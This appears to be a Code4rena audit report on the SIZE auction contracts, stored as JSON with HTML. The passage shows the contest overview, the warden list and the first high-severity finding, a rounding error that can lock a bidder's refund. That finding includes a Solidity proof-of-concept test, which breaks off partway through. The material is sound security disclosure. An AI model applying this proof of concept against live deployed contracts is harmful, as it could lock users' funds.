{
  "circa": {
    "title": "SIZE contest",
    "sponsor": "SIZE",
    "slug": "2022-11-size",
    "date": "2023-01-09",
    "findings": "https://github.com/code-423n4/2022-11-size-findings/issues",
    "contest": 180
  },
  "html": "<h1 id=\"overview\" style=\"position:relative;\"><a href=\"#overview\" aria-label=\"overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overview</h1>\n<h2 id=\"about-c4\" style=\"position:relative;\"><a href=\"#about-c4\" aria-label=\"about c4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>About C4</h2>\n<p>Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.</p>\n<p>A C4 audit contest is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.</p>\n<p>During the audit contest outlined in this document, C4 conducted an analysis of the SIZE smart contract system written in Solidity. The audit contest took place between November 4-8, 2022.</p>\n<h2 id=\"wardens\" style=\"position:relative;\"><a href=\"#wardens\" aria-label=\"wardens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Wardens</h2>\n<p>99 Wardens contributed reports to the SIZE contest:</p>\n<ol>\n<li>0x1f8b</li>\n<li>0x52</li>\n<li><a href=\"https://twitter.com/0xSmartContract\">0xSmartContract</a></li>\n<li>0xc0ffEE</li>\n<li><a href=\"https://twitter.com/0xdapper_\">0xdapper</a></li>\n<li>0xdeadbeef</li>\n<li><a href=\"https://twitter.com/8olidity\">8olidity</a></li>\n<li><a href=\"https://github.com/Aymen1001\">Aymen0909</a></li>\n<li>B2</li>\n<li>Bnke0x0</li>\n<li><a href=\"https://twitter.com/Deivitto\">Deivitto</a></li>\n<li>Diana</li>\n<li>Dinesh11G</li>\n<li>HE1M</li>\n<li><a href=\"https://twitter.com/sm4rtcontr4ct\">JC</a></li>\n<li>JTJabba</li>\n<li>Josiah</li>\n<li>KIntern_NA (TrungOre and duc)</li>\n<li>KingNFT</li>\n<li>Lambda</li>\n<li>M4TZ1P (<a href=\"https://twitter.com/huna38699\">DekaiHako</a>, holyhansss_kr, <a href=\"https://twitter.com/younsle1\">Zer0Luck</a>, AAIIWITF and <a href=\"https://github.com/exd0tpy\">exd0tpy</a>)</li>\n<li>Matin</li>\n<li><a href=\"https://twitter.com/thePicodes\">Picodes</a></li>\n<li>PwnedNoMore (<a href=\"https://www.cs.purdue.edu/homes/zhan3299/index.html\">izhuer</a>, ItsNio, papr1ka2 and <a href=\"https://twitter.com/0xtarafans\">wen</a>)</li>\n<li>R2</li>\n<li><a href=\"https://www.linkedin.com/in/nhan-vo-a9473019a/\">Rahoz</a></li>\n<li>RaymondFam</li>\n<li>RedOneN</li>\n<li>ReyAdmirado</li>\n<li>Rolezn</li>\n<li><a href=\"https://twitter.com/0xruhum\">Ruhum</a></li>\n<li><a href=\"https://www.linkedin.com/in/sathishkumar-p-26069915a\">Sathish9098</a></li>\n<li><a href=\"https://mobile.twitter.com/tomj_bb\">TomJ</a></li>\n<li><a href=\"https://twitter.com/trust__90\">Trust</a></li>\n<li>TwelveSec (<a href=\"https://decorativepineapple.github.io/\">0xDecorativePineapple</a>, gkaragiannidis and 0xRav3n)</li>\n<li>V_B (Barichek and vlad_bochok)</li>\n<li>__141345__</li>\n<li>ajtra</li>\n<li><a href=\"https://twitter.com/agfviggiano\">aviggiano</a></li>\n<li><a href=\"https://twitter.com/bin2chen\">bin2chen</a></li>\n<li>brgltd</li>\n<li>c7e7eff</li>\n<li>cccz</li>\n<li>chaduke</li>\n<li>codexploder</li>\n<li>corerouter</li>\n<li>cryptonue</li>\n<li>cryptostellar5</li>\n<li>cryptphi</li>\n<li>ctf_sec</li>\n<li>delfin454000</li>\n<li>djxploit</li>\n<li>fs0c</li>\n<li>gianganhnguyen</li>\n<li><a href=\"https://www.linkedin.com/in/georgi-nikolaev-georgiev-978253219\">gogo</a></li>\n<li>gz627</li>\n<li>halden</li>\n<li><a href=\"https://twitter.com/hansfriese\">hansfriese</a></li>\n<li>hihen</li>\n<li>horsefacts</li>\n<li>jayphbee</li>\n<li><a href=\"https://twitter.com/JoeStakey\">joestakey</a></li>\n<li>karanctf</li>\n<li>ktg</li>\n<li>ladboy233</li>\n<li>leosathya</li>\n<li>lukris02</li>\n<li>mcwildy</li>\n<li>minhtrng</li>\n<li>neko_nyaa</li>\n<li>neumo</li>\n<li><a href=\"https://twitter.com/andyfeili\">oyc_109</a></li>\n<li>pashov</li>\n<li>peanuts</li>\n<li><a href=\"https://twitter.com/ret2basic\">ret2basic</a></li>\n<li>ronnyx2017</li>\n<li>rvierdiiev</li>\n<li>sashik_eth</li>\n<li>shark</li>\n<li>simon135</li>\n<li>skyle</li>\n<li>slowmoses</li>\n<li>tnevler</li>\n<li>tonisives</li>\n<li>trustindistrust</li>\n<li>wagmi</li>\n<li>yixxas</li>\n<li>zapaz</li>\n</ol>\n<p>This contest was judged by <a href=\"https://github.com/0xean\">0xean</a>.</p>\n<p>Final report assembled by <a href=\"https://twitter.com/CloudEllie1\">CloudEllie</a>.</p>\n<h1 id=\"summary\" style=\"position:relative;\"><a href=\"#summary\" aria-label=\"summary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h1>\n<p>The C4 analysis yielded an aggregated total of 9 unique vulnerabilities. Of these vulnerabilities, 2 received a risk rating in the category of HIGH severity and 7 received a risk rating in the category of MEDIUM severity.</p>\n<p>Additionally, C4 analysis included 29 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 31 reports recommending gas optimizations.</p>\n<p>All of the issues presented here are linked back to their original finding.</p>\n<h1 id=\"scope\" style=\"position:relative;\"><a href=\"#scope\" aria-label=\"scope permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scope</h1>\n<p>The code under review can be found within the <a href=\"https://github.com/code-423n4/2022-11-size\">C4 SIZE contest repository</a>, and is composed of 4 smart contracts written in the Solidity programming language and includes 485 lines of Solidity code.</p>\n<h1 id=\"severity-criteria\" style=\"position:relative;\"><a href=\"#severity-criteria\" aria-label=\"severity criteria permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Severity Criteria</h1>\n<p>C4 assesses the severity of disclosed vulnerabilities according to a methodology based on <a href=\"https://owasp.org/www-community/OWASP_Risk_Rating_Methodology\">OWASP standards</a>.</p>\n<p>Vulnerabilities are divided into three primary risk categories: high, medium, and low/non-critical.</p>\n<p>High-level considerations for vulnerabilities span the following key areas when conducting assessments:</p>\n<ul>\n<li>Malicious Input Handling</li>\n<li>Escalation of privileges</li>\n<li>Arithmetic</li>\n<li>Gas use</li>\n</ul>\n<p>Further information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on <a href=\"https://code4rena.com\">the C4 website</a>.</p>\n<h1 id=\"high-risk-findings-2\" style=\"position:relative;\"><a href=\"#high-risk-findings-2\" aria-label=\"high risk findings 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>High Risk Findings (2)</h1>\n<h2 id=\"h-01-bidders-might-fail-to-withdraw-their-unused-funds-after-the-auction-was-finalized-because-the-contract-doesnt-have-enough-balance\" style=\"position:relative;\"><a href=\"#h-01-bidders-might-fail-to-withdraw-their-unused-funds-after-the-auction-was-finalized-because-the-contract-doesnt-have-enough-balance\" aria-label=\"h 01 bidders might fail to withdraw their unused funds after the auction was finalized because the contract doesnt have enough balance permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/94\">[H-01] Bidders might fail to withdraw their unused funds after the auction was finalized because the contract doesn’t have enough balance.</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/94\">hansfriese</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/144\">ktg</a></em></p>\n<p>Bidders might fail to withdraw their unused funds after the auction was finalized because the contract doesn’t have enough balance.</p>\n<p>The main flaw is the seller might receive more quote tokens than the bidders offer after the auction was finalized.</p>\n<p>If there is no other auctions to use the same quote token, the last bidder will fail to withdraw his funds because the contract doesn’t have enough balance of quote token.</p>\n<h3 id=\"proof-of-concept\" style=\"position:relative;\"><a href=\"#proof-of-concept\" aria-label=\"proof of concept permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>After the auction was finalized, the seller receives the <code>filledQuote</code> amount of quote token using <a href=\"https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L325\">data.filledBase</a>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"0\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Calculate quote amount based on clearing price</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">filledQuote</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">FixedPointMathLib</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mulDivDown</span><span class=\"mtk1\">(</span><span class=\"mtk12\">clearingQuote</span><span class=\"mtk1\">, </span><span class=\"mtk12\">data</span><span class=\"mtk1\">.</span><span class=\"mtk12\">filledBase</span><span class=\"mtk1\">, </span><span class=\"mtk12\">clearingBase</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>But when the bidders withdraw the funds using <code>withdraw()</code>, they offer the quote token <a href=\"https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L375-L382\">using this formula</a>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"1\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Refund unfilled quoteAmount on first withdraw</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">b</span><span class=\"mtk1\">.</span><span class=\"mtk12\">quoteAmount</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">quoteBought</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">FixedPointMathLib</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mulDivDown</span><span class=\"mtk1\">(</span><span class=\"mtk12\">baseAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">a</span><span class=\"mtk1\">.</span><span class=\"mtk12\">data</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lowestQuote</span><span class=\"mtk1\">, </span><span class=\"mtk12\">a</span><span class=\"mtk1\">.</span><span class=\"mtk12\">data</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lowestBase</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">refundedQuote</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">b</span><span class=\"mtk1\">.</span><span class=\"mtk12\">quoteAmount</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">quoteBought</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">b</span><span class=\"mtk1\">.</span><span class=\"mtk12\">quoteAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">SafeTransferLib</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">a</span><span class=\"mtk1\">.</span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">quoteToken</span><span class=\"mtk1\">), </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">refundedQuote</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>Even if they use the same clearing price, the total amount of quote token that the bidders offer might be less than the amount that the seller charged during finalization because the round down would happen several times with the bidders.</p>\n<p>This is the test to show the scenario.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"2\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testAuditBidderMoneyLock</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// in this scenario, we show that bidder&#39;s money can be locked due to inaccurate calculation of claimed quote tokens for a seller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">K</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">baseToSell</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">4</span><span class=\"mtk1\">*</span><span class=\"mtk12\">K</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">aid</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">seller</span><span class=\"mtk1\">.</span><span class=\"mtk11\">createAuction</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">baseToSell</span><span class=\"mtk1\">, </span><span class=\"mtk12\">reserveQuotePerBase</span><span class=\"mtk1\">, </span><span class=\"mtk12\">minimumBidQuote</span><span class=\"mtk1\">, </span><span class=\"mtk12\">startTime</span><span class=\"mtk1\">, </span><span class=\"mtk12\">endTime</span><span class=\"mtk1\">, </span><span class=\"mtk12\">unlockTime</span><span class=\"mtk1\">, </span><span class=\"mtk12\">unlockEnd</span><span class=\"mtk1\">, </span><span class=\"mtk12\">cliffPercent</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bidder1</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setAuctionId</span><span class=\"mtk1\">(</span><span class=\"mtk12\">aid</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bidder1</span><span class=\"mtk1\">.</span><span class=\"mtk11\">bidOnAuctionWithSalt</span><span class=\"mtk1\">(</span><span class=\"mtk7\">3</span><span class=\"mtk1\">*</span><span class=\"mtk12\">K</span><span class=\"mtk1\">, </span><span class=\"mtk7\">3</span><span class=\"mtk1\">*</span><span class=\"mtk12\">K</span><span class=\"mtk1\">+</span><span class=\"mtk7\">2</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Honest bidder&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bidder2</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setAuctionId</span><span class=\"mtk1\">(</span><span class=\"mtk12\">aid</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bidder2</span><span class=\"mtk1\">.</span><span class=\"mtk11\">bidOnAuctionWithSalt</span><span class=\"mtk1\">(</span><span class=\"mtk7\">2</span><span class=\"mtk1\">*</span><span class=\"mtk12\">K</span><span class=\"mtk1\">, </span><span class=\"mtk7\">2</span><span class=\"mtk1\">*</span><span class=\"mtk12\">K</span><span class=\"mtk1\">+</span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Honest bidder&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">endTime</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bidIndices</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uint</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bidIndices</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bidIndices</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">] = </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">seller</span><span class=\"mtk1\">.</span><span class=\"mtk11\">finalize</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bidIndices</span><span class=\"mtk1\">, </span><span class=\"mtk7\">2</span><span class=\"mtk1\">*</span><span class=\"mtk12\">K</span><span class=\"mtk1\">, </span><span class=\"mtk7\">2</span><span class=\"mtk1\">*</span><span class=\"mtk12\">K</span><span class=\"mtk1\">+</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">log_string</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Seller claimed&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// seller claimed 4*K+2</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">quoteToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">seller</span><span class=\"mtk1\">)), </span><span class=\"mtk7\">4</span><span class=\"mtk1\">*</span><span class=\"mtk12\">K</span><span class=\"mtk1\">+</span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// contract has K+1 quote token left</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">quoteToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auction</span><span class=\"mtk1\">)), </span><span class=\"mtk12\">K</span><span class=\"mtk1\">+</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// bidder1 withdraws</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bidder1</span><span class=\"mtk1\">.</span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">log_string</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Bidder 1 withdrew&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// contract has K quote token left</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">quoteToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auction</span><span class=\"mtk1\">)), </span><span class=\"mtk12\">K</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// bidder2 withdraws and he is supposed to be able to claim K+1 quote tokens</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// but the protocol reverts because of insufficient quote tokens</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bidder2</span><span class=\"mtk1\">.</span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">log_string</span><span 